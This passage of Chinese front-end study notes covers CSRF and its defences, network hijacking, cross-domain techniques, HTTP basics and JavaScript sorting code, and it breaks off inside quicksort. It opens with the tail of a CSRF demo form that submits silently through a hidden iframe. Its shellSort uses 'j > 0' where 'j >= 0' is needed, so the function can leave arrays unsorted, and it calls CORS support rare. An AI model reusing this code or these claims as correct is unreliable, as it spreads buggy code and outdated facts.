            &lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;&gt;
        &lt;/form&gt;
        &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>效果如图</p>
<p><img src="https://segmentfault.com/img/bVB9DR" alt="image"></p>
<p>点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？</p>
<p>最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。</p>
<p>另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过</p>
<h3 id="网络劫持攻击">网络劫持攻击</h3>
<p>很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。</p>
<p>如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密&ndash;即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。</p>
<h3 id="控制台注入代码">控制台注入代码</h3>
<h3 id="我们平时开发要注意些什么">我们平时开发要注意些什么？</h3>
<ul>
<li>开发时要提防用户产生的内容，要对用户输入的信息进行层层检测</li>
<li>要注意对用户的输出内容进行过滤(进行转义等)</li>
<li>重要的内容记得要加密传输(无论是利用https也好，自己加密也好)</li>
<li>get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。</li>
<li>对于URL上携带的信息，要谨慎使用。</li>
<li>心中时刻记着，自己的网站哪里可能有危险。</li>
</ul>
<h2 id="2-跨域">==2. 跨域==</h2>
<p>受浏览器同源策略的限制，本域的js不能操作其他域的页面对象（比如DOM）。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象</p>
<p>单向跨域（一般用于获取数据）</p>
<h3 id="jsonp">jsonp</h3>
<p>原理：因为通过script标签引入的js是不受同源策略的限制的（正如前文提到的baidu.com的页面加载了google.com的js）。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用，如返回JSONP_getUsers([&ldquo;paco&rdquo;,&ldquo;john&rdquo;,&ldquo;lili&rdquo;])，也就是说此文件返回的结果调用了JSONP_getUsers函数，并且把[&ldquo;paco&rdquo;,&ldquo;john&rdquo;,&ldquo;lili&rdquo;]传进去，这个[&ldquo;paco&rdquo;,&ldquo;john&rdquo;,&ldquo;lili&rdquo;]是一个用户列表。那么如果此时我们的页面中有一个JSONP_getUsers函数，那么JSONP_getUsers就被调用到，并且传入了用户列表。此时就实现了在本域获取其他域数据的功能，也就是跨域</p>
<h3 id="动态创建script标签">动态创建script标签</h3>
<p>这种方法其实是JSONP跨域的简化版，JSONP只是在此基础上加入了回调函数。</p>
<h3 id="access-control">Access Control</h3>
<p>此跨域方法目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access- Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如baidu.com对google.com下的getUsers.php发送了一个跨域的HTTP请求（通过ajax），那么getUsers.php必须加入如下的响应头：</p>
<pre><code>header(&quot;Access-Control-Allow-Origin: http://www.baidu.com&quot;);//表示允许baidu.com跨域请求本文件
</code></pre><h3 id="windowname">window.name</h3>
<p>window 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p>
<h3 id="服务器代理">服务器代理</h3>
<p>在数据提供方没有提供对JSONP协议或者 window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当baidu.com域下的页面需要请求google.com下的资源文件getUsers.php时，直接发送一个指向 google.com/getUsers.php的Ajax请求肯定是会被浏览器阻止。这时，我们在baidu.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如baidu.com/proxy/, 然后这个代理发送HTTP请求访问google.com下的getUsers.php，跨域的HTTP请求是在服务器端进行的（服务器端没有同源策略限制），客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性。</p>
<h3 id="documentdomain两个iframe之间">document.domain（两个iframe之间）</h3>
<p>通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如baidu.com和 youxi.baidu.com是不同的域，这时，我们无法在baidu.com下的页面中调用youxi.baidu.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为baidu.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相获取对方数据或者操作对方DOM了。</p>
<p>问题：
1、安全性，当一个站点被攻击后，另一个站点会引起安全漏洞。
2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。</p>
<h3 id="locationhash两个iframe之间又称fimfragment-identitier-messaging的简写">location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写</h3>
<p>因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。</p>
<h3 id="使用html5的postmessage方法两个iframe之间或者两个页面之间">使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）</h3>
<p>高级浏览器Internet Explorer 8+, chrome，Firefox , Opera  和 Safari 都将支持这个功能。这个功能主要包括接受信息的&quot;message&quot;事件和发送消息的&quot;postMessage&quot;方法。比如baidu.com域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信</p>
<p>A页面通过postMessage方法发送消息：</p>
<pre><code>window.onload = function() {  
    var ifr = document.getElementById('ifr');  
    var targetOrigin = &quot;http://www.google.com&quot;;  
    ifr.contentWindow.postMessage('hello world!', targetOrigin);  
};
</code></pre><p>postMessage的使用方法：</p>
<p>otherWindow.postMessage(message, targetOrigin);</p>
<p>otherWindow:   指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口
message:   是要发送的消息，类型为 String、Object (IE8、9 不支持)
targetOrigin:   是限定消息接收范围，不限制请使用 &lsquo;*&rsquo;</p>
<p>B页面通过message事件监听并接受消息:</p>
<pre><code>var onmessage = function (event) {  
  var data = event.data;//消息  
  var origin = event.origin;//消息来源地址  
  var source = event.source;//源Window对象  
  if(origin==&quot;http://www.baidu.com&quot;){  
console.log(data);//hello world!  
  }  
};  
if (typeof window.addEventListener != 'undefined') {  
  window.addEventListener('message', onmessage, false);  
} else if (typeof window.attachEvent != 'undefined') {  
  //for ie  
  window.attachEvent('onmessage', onmessage);  
}
</code></pre><h2 id="3一次完整的http事务是怎样的一个过程">==3.一次完整的HTTP事务是怎样的一个过程？==</h2>
<p>基本流程：
a. 域名解析
b. 发起TCP的3次握手
c. 建立TCP连接后发起http请求
d. 服务器端响应http请求，浏览器得到html代码
e. 浏览器解析html代码，并请求html代码中的资源
f. 浏览器对页面进行渲染呈现给用户</p>
<h2 id="4-排序算法">==4. 排序算法==</h2>
<p><img src="http://oe51jhwvd.bkt.clouddn.com/1.png" alt="image"></p>
<h3 id="冒泡排序">冒泡排序</h3>
<p>两两比较，若反则交换位置</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> bubbleSort(arr) {
    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; j <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span> <span style="color:#000;font-weight:bold">-</span> i; j<span style="color:#000;font-weight:bold">++</span>) {
            <span style="color:#000;font-weight:bold">if</span> (arr[j] <span style="color:#000;font-weight:bold">&gt;</span> arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>]) {        <span style="color:#998;font-style:italic">//相邻元素两两对比
</span><span style="color:#998;font-style:italic"></span>                <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>];        <span style="color:#998;font-style:italic">//元素交换
</span><span style="color:#998;font-style:italic"></span>                arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> arr[j];
                arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
            }
        }
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="选择排序">选择排序</h3>
<p>每次都找最小的数</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> selectionSort(arr) {
    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
    <span style="color:#000;font-weight:bold">var</span> minIndex, temp;
    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>; i<span style="color:#000;font-weight:bold">++</span>) {
        minIndex <span style="color:#000;font-weight:bold">=</span> i;
        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>; j <span style="color:#000;font-weight:bold">&lt;</span> len; j<span style="color:#000;font-weight:bold">++</span>) {
            <span style="color:#000;font-weight:bold">if</span> (arr[j] <span style="color:#000;font-weight:bold">&lt;</span> arr[minIndex]) {     <span style="color:#998;font-style:italic">//寻找最小的数
</span><span style="color:#998;font-style:italic"></span>                minIndex <span style="color:#000;font-weight:bold">=</span> j;                 <span style="color:#998;font-style:italic">//将最小数的索引保存
</span><span style="color:#998;font-style:italic"></span>            }
        }
        temp <span style="color:#000;font-weight:bold">=</span> arr[i];
        arr[i] <span style="color:#000;font-weight:bold">=</span> arr[minIndex];
        arr[minIndex] <span style="color:#000;font-weight:bold">=</span> temp;
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="插入排序">插入排序</h3>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> insertionSort(arr) {
    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
    <span style="color:#000;font-weight:bold">var</span> preIndex, current;
    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
        preIndex <span style="color:#000;font-weight:bold">=</span> i <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>;
        current <span style="color:#000;font-weight:bold">=</span> arr[i];
        <span style="color:#000;font-weight:bold">while</span>(preIndex <span style="color:#000;font-weight:bold">&gt;=</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[preIndex] <span style="color:#000;font-weight:bold">&gt;</span> current) {
            arr[preIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> arr[preIndex];
            preIndex<span style="color:#000;font-weight:bold">--</span>;
        }
        arr[preIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> current;
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="希尔排序">希尔排序</h3>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> shellSort(arr) {
    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length,
        temp,
        gap <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>;
    <span style="color:#000;font-weight:bold">while</span>(gap <span style="color:#000;font-weight:bold">&lt;</span> len<span style="color:#000;font-weight:bold">/</span><span style="color:#099">3</span>) {          <span style="color:#998;font-style:italic">//动态定义间隔序列
</span><span style="color:#998;font-style:italic"></span>        gap <span style="color:#000;font-weight:bold">=</span>gap<span style="color:#000;font-weight:bold">*</span><span style="color:#099">3</span><span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>;
    }
    <span style="color:#000;font-weight:bold">for</span> (gap; gap<span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span>; gap <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(gap<span style="color:#000;font-weight:bold">/</span><span style="color:#099">3</span>)) {
        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> gap; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
            temp <span style="color:#000;font-weight:bold">=</span> arr[i];
            <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> i<span style="color:#000;font-weight:bold">-</span>gap; j <span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[j]<span style="color:#000;font-weight:bold">&gt;</span> temp; j<span style="color:#000;font-weight:bold">-=</span>gap) {
                arr[j<span style="color:#000;font-weight:bold">+</span>gap] <span style="color:#000;font-weight:bold">=</span> arr[j];
            }
            arr[j<span style="color:#000;font-weight:bold">+</span>gap] <span style="color:#000;font-weight:bold">=</span> temp;
        }
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="归并排序">归并排序</h3>
<p><img src="http://oe51jhwvd.bkt.clouddn.com/5.gif" alt="image"></p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> mergeSort(arr) {  <span style="color:#998;font-style:italic">//采用自上而下的递归方法
</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
    <span style="color:#000;font-weight:bold">if</span>(len <span style="color:#000;font-weight:bold">&lt;</span> <span style="color:#099">2</span>) {
        <span style="color:#000;font-weight:bold">return</span> arr;
    }
    <span style="color:#000;font-weight:bold">var</span> middle <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(len <span style="color:#000;font-weight:bold">/</span> <span style="color:#099">2</span>),
        left <span style="color:#000;font-weight:bold">=</span> arr.slice(<span style="color:#099">0</span>, middle),
        right <span style="color:#000;font-weight:bold">=</span> arr.slice(middle);
    <span style="color:#000;font-weight:bold">return</span> merge(mergeSort(left), mergeSort(right));
}

<span style="color:#000;font-weight:bold">function</span> merge(left, right)
{
    <span style="color:#000;font-weight:bold">var</span> result <span style="color:#000;font-weight:bold">=</span> [];

    <span style="color:#000;font-weight:bold">while</span> (left.length<span style="color:#000;font-weight:bold">&gt;</span><span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> right.length<span style="color:#000;font-weight:bold">&gt;</span><span style="color:#099">0</span>) {
        <span style="color:#000;font-weight:bold">if</span> (left[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">&lt;=</span> right[<span style="color:#099">0</span>]) {
            result.push(left.shift());
        } <span style="color:#000;font-weight:bold">else</span> {
            result.push(right.shift());
        }
    }

    <span style="color:#000;font-weight:bold">while</span> (left.length)
        result.push(left.shift());

    <span style="color:#000;font-weight:bold">while</span> (right.length)
        result.push(right.shift());

    <span style="color:#000;font-weight:bold">return</span> result;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="快速排序">快速排序</h3>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
